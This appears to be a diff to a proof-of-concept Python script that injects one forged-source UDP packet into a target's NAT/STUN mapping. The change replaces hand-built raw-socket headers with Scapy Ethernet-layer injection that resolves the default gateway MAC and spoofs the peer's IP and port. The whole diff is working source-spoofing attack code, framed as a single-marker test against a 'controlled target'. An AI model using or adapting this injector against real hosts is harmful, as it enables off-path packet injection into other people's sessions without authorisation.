@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
-"""Send exactly one forged-source UDP marker from a separate macOS runner."""
-import ipaddress, json, os, socket, struct, subprocess, sys, time, pathlib
+"""Send exactly one forged-source UDP marker using Scapy L2 injection on macOS."""
+import json, pathlib, subprocess, sys, time
+from scapy.all import Ether, IP, UDP, Raw, sendp, get_if_hwaddr, getmacbyip
 
 out = pathlib.Path("offpath-stun-results")
 out.mkdir(parents=True, exist_ok=True)
@@ -12,59 +13,60 @@ if not mapping_path.exists():
     raise SystemExit("TIMEOUT waiting for published target mapping")
 
 m = json.loads(mapping_path.read_text())
-attacker_ip = subprocess.run(["curl", "-4", "--connect-timeout", "5", "--max-time", "10", "-fsS", "https://api.ipify.org"], capture_output=True, text=True, timeout=15).stdout.strip() or "UNKNOWN"
+try:
+    attacker_ip = subprocess.run(
+        ["curl", "-4", "--connect-timeout", "5", "--max-time", "10", "-fsS", "https://api.ipify.org"],
+        capture_output=True, text=True, timeout=15
+    ).stdout.strip() or "UNKNOWN"
+except Exception:
+    attacker_ip = "UNKNOWN"
+
 if attacker_ip in (m["client_public_ip"], m["peer_ip"]):
     raise SystemExit("FAIL: attacker, target, and peer must have distinct public IPs")
 
-src = ipaddress.IPv4Address(m["peer_ip"]).packed
-dst = ipaddress.IPv4Address(m["client_public_ip"]).packed
-sport = int(m["peer_port"])
-dport = int(m["client_public_port"])
+route = subprocess.check_output(["route", "-n", "get", "default"], text=True)
+iface = next((line.split(":", 1)[1].strip() for line in route.splitlines() if line.strip().startswith("interface:")), None)
+gateway = next((line.split(":", 1)[1].strip() for line in route.splitlines() if line.strip().startswith("gateway:")), None)
+if not iface or not gateway:
+    raise SystemExit(f"FAIL: cannot determine default interface/gateway: {route}")
+
+src_mac = get_if_hwaddr(iface)
+dst_mac = getmacbyip(gateway)
+if not dst_mac:
+    raise SystemExit(f"FAIL: cannot resolve gateway MAC {gateway} on {iface}")
+
 payload = b"OFFPATH-DELIVERY-PROOF"
-udp = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload
-total_len = 20 + len(udp)
-
-# Darwin IP_HDRINCL expects ip_len and ip_off as host-endian fields.
-header = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total_len, 0x4D53, 0, 64, 17, 0, src, dst)
-header = bytearray(header)
-header[2:4] = struct.pack("=H", total_len)
-header[4:6] = struct.pack("=H", 0)
-header[10:12] = b"\x00\x00"
-
-def ip_checksum(data):
-    if len(data) & 1:
-        data += b"\x00"
-    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
-    while total >> 16:
-        total = (total & 0xffff) + (total >> 16)
-    return (~total) & 0xffff
-
-# Compute checksum over the on-wire (network-byte-order) header.
-wire_header = bytearray(header)
-wire_header[2:4] = struct.pack("!H", total_len)
-wire_header[4:6] = struct.pack("!H", 0)
-wire_header[10:12] = b"\x00\x00"
-header[10:12] = struct.pack("!H", ip_checksum(bytes(wire_header)))
-if len(header) != 20:
-    raise SystemExit(f"invalid IPv4 header length: {len(header)}")
-packet = bytes(header) + udp
-if len(packet) != total_len:
-    raise SystemExit(f"invalid datagram length: {len(packet)} != {total_len}")
+frame = (
+    Ether(src=src_mac, dst=dst_mac)
+    / IP(src=m["peer_ip"], dst=m["client_public_ip"], ttl=64, id=0x5350)
+    / UDP(sport=int(m["peer_port"]), dport=int(m["client_public_port"]))
+    / Raw(load=payload)
+)
+wire = bytes(frame)
+check = Ether(wire)
+if len(wire) != 14 + 20 + 8 + len(payload):
+    raise SystemExit(f"FAIL: unexpected L2 frame length {len(wire)}")
+if check[IP].len != 20 + 8 + len(payload):
+    raise SystemExit(f"FAIL: bad IPv4 total length {check[IP].len}")
+if check[IP].chksum is None or check[UDP].chksum is None:
+    raise SystemExit("FAIL: missing computed IPv4/UDP checksums")
 
 identity = {
     "attacker_public_ip": attacker_ip,
-    "spoofed_source": f'{m["peer_ip"]}:{sport}',
-    "controlled_target": f'{m["client_public_ip"]}:{dport}',
+    "attacker_interface": iface,
+    "attacker_gateway": gateway,
+    "spoofed_source": f'{m["peer_ip"]}:{m["peer_port"]}',
+    "controlled_target": f'{m["client_public_ip"]}:{m["client_public_port"]}',
     "datagrams_sent": 1,
     "payload_hex": payload.hex(),
+    "ethernet_frame_bytes": len(wire),
+    "ipv4_total_length": check[IP].len,
+    "ipv4_header_checksum": hex(check[IP].chksum),
+    "udp_checksum": hex(check[UDP].chksum),
+    "injection_method": "Scapy sendp L2/pcap"
 }
 (out / "attacker-macos.json").write_text(json.dumps(identity, indent=2) + "\n")
 print("ATTACK_IDENTITY=" + json.dumps(identity, sort_keys=True), flush=True)
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-sent = sock.sendto(packet, (m["client_public_ip"], 0))
-sock.close()
-if sent != len(packet):
-    raise SystemExit(f"FAIL: short raw send {sent}/{len(packet)}")
-print(f"RAW_SEND_ACCEPTED bytes={sent}", flush=True)
+sent = sendp(frame, iface=iface, count=1, verbose=False)
+print(f"SENDP_RETURN={sent!r} COUNT=1 FRAME_BYTES={len(wire)}", flush=True)
